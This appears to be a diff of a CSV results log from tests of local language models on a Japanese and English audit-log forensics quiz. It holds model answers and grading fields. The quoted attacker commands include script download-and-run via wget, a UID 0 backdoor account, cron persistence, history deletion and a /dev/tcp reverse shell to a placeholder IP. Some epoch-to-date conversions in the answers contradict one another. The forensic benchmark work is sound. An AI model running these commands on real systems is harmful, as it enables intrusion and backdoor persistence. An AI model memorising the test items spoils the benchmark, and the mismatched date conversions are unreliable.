+  ""login_time"": ""2025-06-18 14:24:22"",
+  ""c2_ip"": ""198.51.100.197"",
+  ""c2_port"": 5555,
+  ""actions"": [
+    ""id コマンドの実行"",
+    ""uname -a コマンドの実行"",
+    ""/etc/passwd の読み取り"",
+    ""wget -q http://198.51.100.197/sync.sh -O /tmp/.sync.sh の実行"",
+    ""chmod +x /tmp/.sync.sh の実行"",
+    ""bash /tmp/.sync.sh の実行"",
+    ""useradd -o -u 0 -g 0 -M -d /root -s /bin/bash logsync の実行"",
+    ""/etc/cron.d/logsync の作成"",
+    ""/root/.ssh/authorized_keys の確認"",
+    ""bash -c -i >& /dev/tcp/198.51.100.197/5555 0>&1 の実行（接続失敗）"",
+    ""/home/report/.bash_history の削除""
+  ],
+  ""persistence"": [
+    ""ユーザー名 logsync の作成"",
+    ""/etc/cron.d/logsync の作成""
+  ]
+}
+```",1,1,19.07,stop,0,quiz,False,0.0,10,11,True
+2026-11-14T14:16:52,research2-glm4.7,unsloth/GLM-4.7-Flash-GGUF:Q4_K_M,out_audit/audit.log,1,6125,8448.0,725.03,84,11727.4,7.08,20.18,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": false, ""sysupd"": true}","The logs indicate a successful SSH login for the user ""backup"" from IP 203.0.113.45. Following authentication, the user executed several commands to download a script from an external IP, create a new user named ""sysupd"" with root privileges, and modify system files such as the cron directory and the root's SSH authorized_keys. The session was terminated shortly after these suspicious activities were completed.",4,1,22.88,stop,0,summary,False,0.7,,,
+2026-11-14T14:16:52,research2-glm4.7,unsloth/GLM-4.7-Flash-GGUF:Q4_K_M,out_audit/audit.log,1,6125,6133.5,998.61,68,6307.1,10.62,12.44,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": false, ""sysupd"": true}","The audit log shows an unauthorized SSH session from IP 203.0.113.45 where a remote attacker successfully authenticated as the user ""backup"" and then executed malicious commands to create a new system user named ""sysupd"" with root-level privileges, create a malicious cron job, and modify the root user's SSH authorized keys.",4,2,22.88,stop,0,summary,False,0.7,,,
+2026-11-14T14:16:52,research2-glm4.7,unsloth/GLM-4.7-Flash-GGUF:Q4_K_M,out_audit/audit.log,1,6125,6047.2,1012.86,109,5267.1,20.5,11.31,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": false, ""sysupd"": true}","The log captures a successful SSH login for the user ""backup"" from IP 203.0.113.45, followed by a series of suspicious system administration actions performed as root via sudo. The attacker executed commands to download a script (`wget`) from an external IP, modify file permissions, and create a new user (`sysupd`) with root privileges. Additionally, the attacker attempted to modify system files, including creating a cron job and attempting to connect to a specific port, before finally deleting the user's history file and logging out.",4,3,22.88,stop,0,summary,False,0.7,,,
+2026-11-14T14:16:52,research2-glm4.7,unsloth/GLM-4.7-Flash-GGUF:Q4_K_M,out_audit/audit.log,1,6125,4125.5,1484.67,134,17583.6,7.56,21.71,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": false, ""sysupd"": true}","The logs indicate a successful SSH login from IP 203.0.113.45 by the user `backup`, which was subsequently used to establish a reverse shell or command line session. The attacker executed commands to download a malicious script (`upd.sh`) from an external server, create a new user (`sysupd`) with root privileges, and modify system configuration files, such as `/etc/passwd`, `/etc/shadow`, and `/etc/cron.d/sysupd`, as well as the SSH authorized keys. The session was terminated shortly after, leaving traces of malicious activity like the creation of a root-owned cron job and the deletion of the user's history file.",4,4,22.88,stop,0,summary,False,0.7,,,
+2026-11-14T14:17:12,research2-glm4.7,unsloth/GLM-4.7-Flash-GGUF:Q4_K_M,out_audit/audit.log,2,6125,6139.7,997.6,79,10986.9,7.1,17.13,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": true, ""sysupd"": true}","The log shows a successful SSH login for a user named ""backup"" from IP 203.0.113.45, followed by suspicious activity where the intruder downloaded a malicious script from an external IP (198.51.100.23), created a new system user named ""sysupd"" with root privileges, and attempted to establish a reverse shell connection to an attacker-controlled server.",4,1,20.27,stop,0,summary,False,0.7,,,
+2026-11-14T14:17:12,research2-glm4.7,unsloth/GLM-4.7-Flash-GGUF:Q4_K_M,out_audit/audit.log,2,6125,4114.4,1488.67,89,15939.8,5.52,20.05,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": false, ""sysupd"": true}","The audit log reveals a successful SSH login from IP 203.0.113.45 by user ""backup"" followed by a series of suspicious system modifications. An unauthorized user named ""sysupd"" was created with UID 0 (root privileges), and an SSH key was added to `/root/.ssh/authorized_keys`. Additionally, a cron job was created to execute the script, and the user's history was deleted to cover tracks.",4,2,20.27,stop,0,summary,False,0.7,,,
+2026-11-14T14:17:12,research2-glm4.7,unsloth/GLM-4.7-Flash-GGUF:Q4_K_M,out_audit/audit.log,2,6125,6117.8,1001.18,87,7174.5,11.99,13.29,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": false, ""sysupd"": true}","The log shows an attacker successfully compromising the `backup` user account via SSH from IP `203.0.113.45`, despite multiple failed attempts to log in as `root`. Once authenticated, the attacker executed commands to download a malicious script (`wget`), created a new system user (`sysupd`) with root privileges, modified system files (SSH keys and cron jobs), and deleted their own history file to cover traces.",4,3,20.27,stop,0,summary,False,0.7,,,
+2026-11-14T14:17:12,research2-glm4.7,unsloth/GLM-4.7-Flash-GGUF:Q4_K_M,out_audit/audit.log,2,6125,6039.6,1014.15,89,2924.3,30.09,8.96,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": false, ""sysupd"": true}","Multiple authentication attempts were made from IP 203.0.113.45 using the accounts ""root"" and ""backup"". While the ""backup"" user successfully authenticated, the session was used to execute suspicious commands: downloading a script from an external IP, creating a malicious user named ""sysupd"", and deleting the user's command history. Finally, a cron job was created in `/etc/cron.d/sysupd` to ensure persistence.",4,4,20.27,stop,0,summary,False,0.7,,,
+2026-11-14T14:17:35,research2-glm4.7,unsloth/GLM-4.7-Flash-GGUF:Q4_K_M,out_audit/audit.log,3,6125,6137.8,997.92,90,11319.7,7.86,17.46,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": false, ""sysupd"": true}","A remote attacker successfully authenticated via SSH from IP 203.0.113.45 as the `backup` user, then escalated privileges to root to perform malicious activities. The attacker downloaded a script from an external server, created a malicious user named `sysupd` with root privileges, and attempted to establish a network connection. They also deleted the user's bash history file to cover their tracks and created a cron job and SSH key for persistence.",4,1,22.51,stop,0,summary,False,0.7,,,
+2026-11-14T14:17:35,research2-glm4.7,unsloth/GLM-4.7-Flash-GGUF:Q4_K_M,out_audit/audit.log,3,6125,4124.8,1484.93,111,17157.9,6.41,21.28,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": true, ""sysupd"": true}","The log shows a successful SSH login for the `backup` user from IP 203.0.113.45, followed by a series of malicious activities executed with root privileges. The attacker created a new user named `sysupd` with UID 0, modified the `authorized_keys` file in the root directory, and deleted the user's history file. Additionally, the attacker attempted to connect to an external IP (198.51.100.23) and created a cron job in `/etc/cron.d/sysupd` to maintain persistence.",4,2,22.51,stop,0,summary,False,0.7,,,
+2026-11-14T14:17:35,research2-glm4.7,unsloth/GLM-4.7-Flash-GGUF:Q4_K_M,out_audit/audit.log,3,6125,6098.3,1004.38,129,8828.6,14.5,14.93,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": true, ""sysupd"": true}","Multiple failed SSH authentication attempts for users ""root"" and ""backup"" from IP 203.0.113.45 occurred, followed by a successful login for the user ""backup"" from the same source. Once authenticated, the attacker used sudo to execute commands including `wget` (to download `upd.sh` from 198.51.100.23), `chmod` (to make the script executable), and `bash` (to run the script). The attacker then created a new malicious user named ""sysupd"", deleted the backup user's history file, and created a cron job in `/etc/cron.d/sysupd`.",4,3,22.51,stop,0,summary,False,0.7,,,
+2026-11-14T14:17:35,research2-glm4.7,unsloth/GLM-4.7-Flash-GGUF:Q4_K_M,out_audit/audit.log,3,6125,6036.2,1014.71,170,5163.5,32.73,11.2,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": false, ""sysupd"": true}","This log depicts a successful brute-force attack followed by a malicious session on a compromised server. An attacker from IP address 203.0.113.45 attempted multiple failed SSH login attempts for the ""root"" user before successfully authenticating as the ""backup"" user. During the session, the attacker used `sudo` to execute commands such as `wget` to download a script from an external IP, `chmod` to make it executable, and `bash` to run it. The script executed malicious commands, including creating a new user named ""sysupd"" with UID 0 (root privileges), modifying `/etc/passwd` and `/etc/shadow`, and creating a cron job in `/etc/cron.d/sysupd`. Finally, the attacker deleted their history file (`/home/backup/.bash_history`) before terminating the session.",4,4,22.51,stop,0,summary,False,0.7,,,
+2026-11-14T14:20:35,quiz-gpt-oss-120b,unsloth/gpt-oss-120b-GGUF:Q4_K_M,quiz_set/clean1/audit.log,1,3384,22123.0,152.96,1164,77733.9,14.96,99.86,"{""侵害なしと判定"": false, ""攻撃元を挙げていない"": true, ""仕掛けを挙げていない"": true}","**(1) このサーバーは侵害されていますか**  
+ログに成功した認証や不正なコマンド実行、ファイル操作などの記録はありません。すべての `USER_LOGIN` は `res=failed` であり、成功したログインは確認できません。したがって **「不明」** とします。根拠となるレコードの `type` は `USER_LOGIN`（失敗）です。
+
+**(2) 攻撃元の IP アドレスと、侵入に使われたアカウント**  
+ログに記録されている失敗した SSH ログイン試行は以下の IP アドレスからです。  
+
+- 192.0.2.117  
+- 192.0.2.169  
+- 192.0.2.85  
+- 192.0.2.196  
+- 192.0.2.206  
+- 192.0.2.220  
+
+いずれも `acct=""(invalid user)""` で、実際に使用されたアカウントは不明です。したがって **「不明」** とします。
+
+**(3) 侵入に成功した時刻**  
+成功した認証の記録が無いため、**「不明」** です。
+
+**(4) 侵入後に行われた操作（時系列）**  
+成功した侵入が確認できないため、侵入後に実行された操作は **「不明」** です。ログに残っているのは、`cron` による定期実行（`USER_START` / `USER_END`）と、`systemd` のサービス起動/停止（`SERVICE_START` / `SERVICE_STOP`）だけです。
+
+**(5) 攻撃者が接続しようとした外部の IP アドレスとポート番号**  
+`audit.log` にはソケット情報（IP アドレスとポート番号）を示す `SOCKADDR` の記録がありません。したがって **「不明」** です。
+
+**(6) 後で再侵入するために仕掛けられたもの**  
+ログ上に永続化（Persistence）を示すファイル作成、サービス登録、cron への不審なエントリなどは見当たりません。したがって **「不明」**（該当なし）です。
+
+---
+
+### 結論（JSON）
+
+```json
+{
+  ""compromised"": null,
+  ""attacker_ip"": null,
+  ""account"": null,
+  ""login_time"": null,
+  ""c2_ip"": null,
+  ""c2_port"": null,
+  ""actions"": [],
+  ""persistence"": []
+}
+```",1,1,99.87,stop,2030,quiz,False,0.0,2,3,True
+2026-11-14T14:24:08,quiz-gpt-oss-120b,unsloth/gpt-oss-120b-GGUF:Q4_K_M,quiz_set/clean2/audit.log,1,6396,41557.0,153.91,2553,171508.9,14.88,213.07,"{""侵害なしと判定"": true, ""攻撃元を挙げていない"": true, ""仕掛けを挙げていない"": true}","**(1) このサーバーは侵害されていますか**  
+現時点で **侵害された確実な証拠はログに見当たりません**。  
+根拠となるレコードは次のとおりです。  
+
+| type | 内容 | 判定 |
+|------|------|------|
+| `USER_LOGIN` (失敗) | `acct=""(invalid user)""` で `res=failed` – 失敗した外部からのログイン試行 | 攻撃の試み |
+| `USER_AUTH` (成功) | `op=pubkey acct=""tanaka""` / `op=pubkey acct=""deploy""` – 正常な公開鍵認証でのログイン | 正規ユーザーのログイン |
+| `SYSCALL` / `EXECVE` | `tail`, `python manage.py check`, `git status`, `vim`, `git pull`, `systemctl reload nginx` などのコマンド実行 | 正常な操作（管理者・開発者の作業） |
+| `USER_START` / `USER_END` | PAM によるセッション開始・終了 | 正常なセッション管理 |
+
+失敗したログイン試行は外部 IP（例: `192.0.2.178`）からありますが、成功したログインはすべて社内ネットワーク（`10.20.x.x`）からの公開鍵認証です。**不正な権限昇格や不審なバイナリ実行の記録はありません**。
+
+---
+
+**(2) 攻撃元の IP アドレスと、侵入に使われたアカウント**  
+- 攻撃元 IP アドレス：**不明**（成功したログインは社内 IP からのもので、外部からの成功ログインは記録されていません）  
+- 侵入に使われたアカウント：**不明**（成功したアカウントは `tanaka` と `deploy` ですが、これらが正規ユーザーかどうかはログだけでは判別できません）
+
+---
+
+**(3) 侵入に成功した時刻**  
+成功した公開鍵認証は次の 2 件です。  
+
+| アカウント | タイムスタンプ (UTC) | JST (UTC+9) |
+|------------|----------------------|-------------|
+| `tanaka`   | 1794409867.452 秒   | **2026‑11‑02 20:04:27** |
+| `deploy`   | 1794412909.865 秒   | **2026‑11‑03 02:41:49** |
+
+どちらが「侵入」かは判別できないため、**不明** とします。
+
+---
+
+**(4) 侵入後に行われた操作（時系列）**  
+
+1. **2026‑11‑02 20:04:27 JST** – `tanaka` が SSH でログイン（公開鍵認証）  
+2. `tail -n 50 /var/log/nginx/access.log` を実行（ログ閲覧）  
+3. `python3 manage.py check` を実行（Django アプリのチェック）  
+4. `git status` を実行（リポジトリ状態確認）  
+5. `vim app/views.py` を実行（ファイル編集）  
+6. `python3 manage.py check` を再度実行  
+7. **2026‑11‑03 02:41:49 JST** – `deploy` が SSH でログイン（公開鍵認証）  
+8. `git pull --ff-only` を実行（コード更新）  
+9. `sudo /usr/bin/systemctl reload nginx` を実行（nginx 設定リロード）  
+
+※上記はすべて `EXECVE` / `SYSCALL` レコードに記録されたコマンドです。ダウンロード、外部通信、痕跡削除、持続化に相当する操作は確認できません。
+
+---
+
+**(5) 攻撃者が接続しようとした外部の IP アドレスとポート番号**  
+ログ中に `SOCKADDR`（IP とポート）を示すフィールドはありません。したがって **不明** です。
+
+---
+
+**(6) 後で再侵入するために仕掛けられたもの**  
+ログからは永続化（cron、systemd ユニット、SSH 鍵の追加、バックドアスクリプト等）の痕跡は検出できません。したがって **なし**（`[]`）です。
+
+---
+
+### 結論（JSON）
+
+```json
+{
+  ""compromised"": false,
+  ""attacker_ip"": null,
+  ""account"": null,
+  ""login_time"": null,
+  ""c2_ip"": null,
+  ""c2_port"": null,
+  ""actions"": [
+    ""tail -n 50 /var/log/nginx/access.log"",
+    ""python3 manage.py check"",
+    ""git status"",
+    ""vim app/views.py"",
+    ""python3 manage.py check"",
+    ""git pull --ff-only"",
+    ""sudo systemctl reload nginx""
+  ],
+  ""persistence"": []
+}
+```
+
+**要点**  
+- 失敗した外部からのログイン試行はありますが、成功したログインは社内 IP からの正規ユーザーです。  
+- 不審なコマンド実行や永続化の痕跡は見当たりません。  
+- したがって、**現時点でこのサーバーが侵害された確証はありません**。",1,1,213.08,stop,4497,quiz,False,0.0,3,3,True
+2026-11-14T14:28:28,quiz-gpt-oss-120b,unsloth/gpt-oss-120b-GGUF:Q4_K_M,quiz_set/inc1/audit.log,1,6556,40460.8,162.03,3325,219812.6,15.12,260.27,"{""侵害ありと判定"": true, ""攻撃元 IP"": true, ""アカウント"": true, ""侵入時刻（±60秒）"": false, ""接続先 IP"": true, ""接続先ポート"": true, ""スクリプトの取得・実行"": true, ""UID 0 の利用者の追加"": true, ""cron の仕掛け"": true, ""SSH 鍵の仕掛け"": true, ""痕跡の消去"": true}","**(1) このサーバーは侵害されていますか**  
+はい、侵害されています。以下のレコードが根拠です。  
+
+| type | 内容の概要 |
+|------|------------|
+| `USER_AUTH` (成功) | `report` ユーザーで SSH ログインに成功 |
+| `USER_START` / `USER_END` | SSH セッションの開始・終了 |
+| `USER_LOGIN` | ログイン成功 |
+| `SYSCALL` / `EXECVE` | `id`, `uname`, `cat /etc/passwd` などのコマンド実行 |
+| `USER_ACCT` / `USER_CMD` | `sudo` による権限昇格（wget, chmod, useradd, chmod, bash） |
+| `ADD_USER` | `svcmon` という UID 0 の新規ユーザー作成 |
+| `SYSCALL` (chmod, chmod +x) | ダウンロードしたスクリプトに実行権限付与 |
+| `SYSCALL` (connect) | 外部サーバへ接続を試行（失敗） |
+| `PATH` (cron.d) | `/etc/cron.d/svcmon` の作成 |
+| `SYSCALL` (rm) | `.bash_history` の削除 |
+
+---
+
+**(2) 攻撃元の IP アドレスと、侵入に使われたアカウント**  
+
+- 攻撃元 IP アドレス: **203.0.113.247**（`USER_AUTH` の `hostname`/`addr` フィールド）  
+- 侵入に使われたアカウント: **report**（`USER_AUTH` の `acct=""report""` が成功）
+
+---
+
+**(3) 侵入に成功した時刻**  
+
+`USER_AUTH` が成功したレコードのタイムスタンプは `1794409996.800`（Unix epoch 秒）。  
+この時刻を日本時間 (JST, UTC+9) に変換すると **2026‑11‑07 12:53:16 JST**（秒以下は省略）。
+
+---
+
+**(4) 侵入後に行われた操作（時系列）**  
+
+1. `id` コマンド実行（ユーザー情報取得）  
+2. `uname -a` 実行（カーネル情報取得）  
+3. `cat /etc/passwd` 実行（パスワードファイル取得）  
+4. `sudo wget -q http://198.51.100.40/upd.sh -O /tmp/.upd.sh`（外部スクリプト取得）  
+5. `chmod +x /tmp/.upd.sh`（取得したスクリプトに実行権限付与）  
+6. `bash /tmp/.upd.sh`（取得したスクリプト実行）  
+7. `sudo useradd -o -u 0 -g 0 -M -d /root -s /bin/bash svcmon`（UID 0 のバックドアユーザー作成）  
+8. `/etc/cron.d/svcmon` 作成（cron による永続化）  
+9. `/root/.ssh/authorized_keys` 参照（既存の SSH 鍵を確認）  
+10. `connect` 系システムコールで `198.51.100.40:9001` へ接続を試行（失敗）  
+11. `rm /home/report/.bash_history`（コマンド履歴削除）  
+12. SSH セッション終了・ログアウト  
+
+---
+
+**(5) 攻撃者が接続しようとした外部の IP アドレスとポート番号**  
+
+`SOCKADDR` レコード  
+```
+saddr=02002329C63364280000000000000000
+```
+- ファミリ: `0x0002` → AF_INET  
+- ポート: `0x2329` → **9001**（ネットワークバイトオーダ）  
+- IP アドレス: `C6 33 64 28` → **198.51.100.40**  
+
+したがって、**198.51.100.40:9001** へ接続しようとしています。
+
+---
+
+**(6) 後で再侵入するために仕掛けられたもの**  
+
+| 仕掛けたもの | 内容 |
+|--------------|------|
+| ユーザー `svcmon` | UID 0、ホーム `/root`、シェル `/bin/bash` のバックドアアカウント |
+| Cron ジョブ `/etc/cron.d/svcmon` | 定期的に何らかのコマンド（ログには内容が記録されていませんが、永続化の意図） |
+| `/tmp/.upd.sh`（取得したスクリプト） | 実行されたが、残存は不明。永続化の直接的証拠はなし |
+| `.bash_history` の削除 | 攻撃痕跡の消去（再侵入自体の仕掛けではないが、痕跡隠蔽） |
+
+---
+
+### 結論（JSON）
+
+```json
+{
+  ""compromised"": true,
+  ""attacker_ip"": ""203.0.113.247"",
+  ""account"": ""report"",
+  ""login_time"": ""2026-11-07 12:53:16"",
+  ""c2_ip"": ""198.51.100.40"",
+  ""c2_port"": 9001,
+  ""actions"": [
+    ""id"",
+    ""uname -a"",
+    ""cat /etc/passwd"",
+    ""sudo wget -q http://198.51.100.40/upd.sh -O /tmp/.upd.sh"",
+    ""chmod +x /tmp/.upd.sh"",
+    ""bash /tmp/.upd.sh"",
+    ""sudo useradd -o -u 0 -g 0 -M -d /root -s /bin/bash svcmon"",
+    ""create /etc/cron.d/svcmon"",
+    ""access /root/.ssh/authorized_keys"",
+    ""connect to 198.51.100.40:9001 (failed)"",
+    ""rm /home/report/.bash_history"",
+    ""logout""
+  ],
+  ""persistence"": [
+    ""svcmon (UID 0) user account"",
+    ""/etc/cron.d/svcmon cron job""
+  ]
+}
+```",1,1,260.3,stop,5658,quiz,False,0.0,10,11,True
+2026-11-14T14:32:31,quiz-gpt-oss-120b,unsloth/gpt-oss-120b-GGUF:Q4_K_M,quiz_set/inc2/audit.log,1,6458,41332.1,156.25,3061,201457.1,15.19,242.79,"{""侵害ありと判定"": true, ""攻撃元 IP"": true, ""アカウント"": true, ""侵入時刻（±60秒）"": false, ""接続先 IP"": true, ""接続先ポート"": true, ""スクリプトの取得・実行"": true, ""UID 0 の利用者の追加"": true, ""cron の仕掛け"": true, ""SSH 鍵の仕掛け"": true, ""痕跡の消去"": true}","**(1) このサーバーは侵害されていますか**  
+はい、侵害されています。根拠となるレコードの `type` は以下の通りです。
+
+| type | 内容の概要 |
+|------|------------|
+| `USER_AUTH` | 203.0.113.112 から `nagios` アカウントで SSH 認証に成功 (`res=success`) |
+| `LOGIN` / `USER_START` | SSH セッションが確立されたことを示す |
+| `SYSCALL` / `EXECVE` | `id`, `uname`, `cat /etc/passwd`, `wget`, `chmod`, `bash /tmp/.run.sh`, `useradd`, `chmod`, `rm` などのコマンド実行 |
+| `USER_CMD` | `sudo` によるコマンド実行（wget、chmod、useradd、chmod） |
+| `ADD_USER` | 新規ユーザー `logsync` の作成が成功 |
+| `PATH`（`CREATE`） | `/etc/cron.d/logsync` が作成されたこと |
+| `SOCKADDR` | 外部サーバ (198.51.100.34) への接続試行が記録されている |
+
+---
+
+**(2) 攻撃元の IP アドレスと、侵入に使われたアカウント**  
+
+- 攻撃元 IP アドレス: **203.0.113.112**（`USER_AUTH` の `hostname`/`addr` フィールド）  
+- 侵入に使われたアカウント: **nagios**（同上、`acct=""nagios""`）
+
+---
+
+**(3) 侵入に成功した時刻**  
+
+`USER_AUTH` が成功したレコードのタイムスタンプは `1794409481.977` です。  
+Unix epoch (UTC) → **2026‑11‑12 04:12:00.977 JST**（UTC+9）
+
+---
+
+**(4) 侵入後に行われた操作（時系列）**  
+
+1. **2026‑11‑12 04:12:00 JST** – SSH で `nagios` としてログイン (`USER_AUTH` 成功)  
+2. `id` コマンド実行（自分の UID/GID を確認）  
+3. `uname -a` 実行（カーネル情報取得）  
+4. `cat /etc/passwd` 実行（パスワードファイル取得）  
+5. `sudo wget -q http://198.51.100.34/run.sh -O /tmp/.run.sh` ダウンロード  
+6. `sudo chmod +x /tmp/.run.sh` 実行権限付与  
+7. `sudo bash /tmp/.run.sh` スクリプト実行（不正コードの実行）  
+8. `sudo useradd -o -u 0 -g 0 -M -d /root -s /bin/bash logsync` → UID 0 のバックドアユーザー作成  
+9. `ADD_USER` により `logsync` が作成されたことが記録  
+10. `/etc/cron.d/logsync` を作成（cron による永続化）  
+11. `/root/.ssh/authorized_keys` を参照（既存の SSH 鍵取得）  
+12. `bash` から `connect()` 系統のシステムコール失敗（`SOCKADDR` で外部 IP 198.51.100.34、ポート 6667 へ接続試行）  
+13. `rm /home/nagios/.bash_history` によりコマンド履歴を削除（痕跡消去）  
+14. SSH セッション終了（`USER_END`、`USER_LOGOUT`）
+
+---
+
+**(5) 攻撃者が接続しようとした外部の IP アドレスとポート番号**  
+
+`SOCKADDR` レコード  
+```
+saddr=02001A0BC63364220000000000000000
+```
+- ファミリ: `02 00` → AF_INET  
+- ポート: `1A 0B` → 0x1A0B = **6667**  
+- IP アドレス: `C6 33 64 22` → **198.51.100.34**  
+
+したがって、**198.51.100.34:6667** へ接続しようとしています。
+
+---
+
+**(6) 後で再侵入するために仕掛けられたもの**  
+
+| 仕掛けたもの | 内容 |
+|--------------|------|
+| ユーザー `logsync` | UID 0、GID 0、ホーム `/root`、シェル `/bin/bash` で作成されたバックドアアカウント |
+| Cron ジョブ `/etc/cron.d/logsync` | 定期的に何らかのコマンド（スクリプト）を実行させる永続化手段 |
+| ダウンロードされたスクリプト `/tmp/.run.sh` | 実行されたが、削除は記録されていない。再利用の可能性あり |
+| `.bash_history` の削除 | ログの痕跡を減らすための操作（直接的な再侵入手段ではないが、隠蔽に寄与） |
+
+---
+
+### 結論（JSON）
+
+```json
+{
+  ""compromised"": true,
+  ""attacker_ip"": ""203.0.113.112"",
+  ""account"": ""nagios"",
+  ""login_time"": ""2026-11-12 04:12:00"",
+  ""c2_ip"": ""198.51.100.34"",
+  ""c2_port"": 6667,
+  ""actions"": [
+    ""SSH login as nagios (203.0.113.112)"",
+    ""id"",
+    ""uname -a"",
+    ""cat /etc/passwd"",
+    ""sudo wget -q http://198.51.100.34/run.sh -O /tmp/.run.sh"",
+    ""sudo chmod +x /tmp/.run.sh"",
+    ""sudo bash /tmp/.run.sh"",
+    ""sudo useradd -o -u 0 -g 0 -M -d /root -s /bin/bash logsync"",
+    ""ADD_USER logsync"",
+    ""create /etc/cron.d/logsync"",
+    ""read /root/.ssh/authorized_keys"",
+    ""attempt connect to 198.51.100.34:6667 (failed)"",
+    ""rm /home/nagios/.bash_history"",
+    ""SSH session close""
+  ],
+  ""persistence"": [
+    ""user account 'logsync' (UID 0)"",
+    ""cron file /etc/cron.d/logsync""
+  ]
+}
+```",1,1,242.82,stop,4763,quiz,False,0.0,10,11,True
+2026-11-14T14:36:11,quiz-gpt-oss-120b,unsloth/gpt-oss-120b-GGUF:Q4_K_M,quiz_set/inc3/audit.log,1,6662,41721.0,159.68,2639,178075.9,14.81,219.8,"{""侵害ありと判定"": true, ""攻撃元 IP"": true, ""アカウント"": true, ""侵入時刻（±60秒）"": true, ""接続先 IP"": true, ""接続先ポート"": true, ""スクリプトの取得・実行"": true, ""UID 0 の利用者の追加"": true, ""cron の仕掛け"": true, ""SSH 鍵の仕掛け"": false, ""痕跡の消去"": true}","**(1) このサーバーは侵害されていますか**  
+はい、侵害されています。以下のレコードが侵害の根拠です。  
+
+- `USER_LOGIN`（成功） – アカウント **backup** が SSH でログイン  
+- `USER_START` / `USER_END` – セッション開始・終了  
+- `SYSCALL`（exec） – `wget`、`chmod`、`bash` などの実行  
+- `USER_CMD` – `sudo` によるコマンド実行  
+- `ADD_USER` – 新規ユーザー **sysupd** の作成（uid 0）  
+- `SYSCALL`（identity） – `/etc/cron.d/sysupd` の作成（cron による持続化）  
+- `SYSCALL`（delete） – `.bash_history` の削除  
+
+**(2) 攻撃元の IP アドレスと、侵入に使われたアカウント**  
+
+- 攻撃元 IP: **203.0.113.17**（SSH 接続元）  
+- 侵入に使用されたアカウント: **backup**  
+
+**(3) 侵入に成功した時刻**  
+
+- `USER_LOGIN` が成功したタイムスタンプは `1794409942.044`（Unix epoch 秒）。  
+- これを日本時間 (JST, UTC+9) に変換すると **2026‑11‑12 00:12:22** です。  
+
+**(4) 侵入後に行われた操作（時系列）**  
+
+1. `id` コマンド実行（自分の UID/GID 確認）  
+2. `uname -a` 実行（カーネル情報取得）  
+3. `cat /etc/passwd` 実行（パスワードファイル閲覧）  
+4. `sudo wget -q http://198.51.100.104/init.sh -O /tmp/.init.sh`（外部スクリプト取得）  
+5. `sudo chmod +x /tmp/.init.sh`（取得したスクリプトに実行権限付与）  
+6. `sudo bash /tmp/.init.sh`（取得したスクリプト実行）  
+7. `sudo useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sysupd`（UID 0 の新規ユーザー作成）  
+8. `/etc/cron.d/sysupd` 作成（cron による持続化）  
+9. `connect()` 系統呼び出しで `198.51.100.104:4444` へ接続を試行（失敗）  
+10. `.bash_history` 削除（痕跡消去）  
+11. SSH セッション終了（`USER_END`、`USER_LOGOUT`）  
+
+**(5) 攻撃者が接続しようとした外部の IP アドレスとポート番号**  
+
+- `SOCKADDR` の内容 `0200115CC63364680000000000000000` を解読すると  
+  - IP アドレス: **198.51.100.104**  
+  - ポート番号: **4444**  
+
+**(6) 後で再侵入するために仕掛けられたもの**  
+
+- 新規ユーザー **sysupd**（UID 0、root 権限）  
+- cron ジョブファイル **/etc/cron.d/sysupd**（定期的にスクリプト等を実行させる）  
+
+---
+
+### 結論（JSON）
+
+```json
+{
+  ""compromised"": true,
+  ""attacker_ip"": ""203.0.113.17"",
+  ""account"": ""backup"",
+  ""login_time"": ""2026-11-12 00:12:22"",
+  ""c2_ip"": ""198.51.100.104"",
+  ""c2_port"": 4444,
+  ""actions"": [
+    ""id"",
+    ""uname -a"",
+    ""cat /etc/passwd"",
+    ""sudo wget -q http://198.51.100.104/init.sh -O /tmp/.init.sh"",
+    ""sudo chmod +x /tmp/.init.sh"",
+    ""sudo bash /tmp/.init.sh"",
+    ""sudo useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sysupd"",
+    ""create cron /etc/cron.d/sysupd"",
+    ""delete /home/backup/.bash_history""
+  ],
+  ""persistence"": [
+    ""user sysupd (uid 0) created"",
+    ""cron job /etc/cron.d/sysupd""
+  ]
+}
+```",1,1,219.82,stop,4769,quiz,False,0.0,10,11,True
+2026-11-14T14:41:40,quiz-gpt-oss-120b,unsloth/gpt-oss-120b-GGUF:Q4_K_M,quiz_set/inc4/audit.log,1,6654,41422.9,160.64,3837,287771.4,13.33,329.19,"{""侵害ありと判定"": true, ""攻撃元 IP"": true, ""アカウント"": true, ""侵入時刻（±60秒）"": false, ""接続先 IP"": true, ""接続先ポート"": true, ""スクリプトの取得・実行"": true, ""UID 0 の利用者の追加"": true, ""cron の仕掛け"": true, ""SSH 鍵の仕掛け"": false, ""痕跡の消去"": true}","**(1) このサーバーは侵害されていますか**  
+はい、侵害されています。以下のレコードが根拠です。  
+
+| type | 内容の概要 |
+|------|------------|
+| `USER_LOGIN` | `nagios` アカウントで SSH ログインに成功 |
+| `USER_AUTH` | `root` への認証失敗が続くが、`nagios` で成功 |
+| `LOGIN` / `USER_START` | PAM によるセッション開始が記録 |
+| `SYSCALL` / `EXECVE` | `id`, `uname`, `cat /etc/passwd`, `wget`, `chmod`, `bash`, `useradd`, `rm` などのコマンド実行 |
+| `USER_ACCT` / `USER_CMD` | `sudo` による権限昇格が成功 |
+| `ADD_USER` | `dbmaint` ユーザー（UID 0）を追加 |
+| `PATH` | `/etc/cron.d/dbmaint` が作成 |
+| `SOCKADDR` | 外部サーバへの接続試行（IP/ポート） |
+
+**(2) 攻撃元の IP アドレスと、侵入に使われたアカウント**  
+- 攻撃元 IP: **203.0.113.173**（SSH 接続元）  
+- 侵入に使用されたアカウント: **nagios**（`USER_LOGIN` が成功）
+
+**(3) 侵入に成功した時刻**  
+`USER_LOGIN` が成功したレコードのタイムスタンプは `1794409633.495` です。  
+Unix 時間 1794409633 → **2026‑11‑17 07:03:53 JST**（UTC+9）
+
+**(4) 侵入後に行われた操作（時系列）**  
+
+| JST 時刻 | 操作内容 |
+|----------|----------|
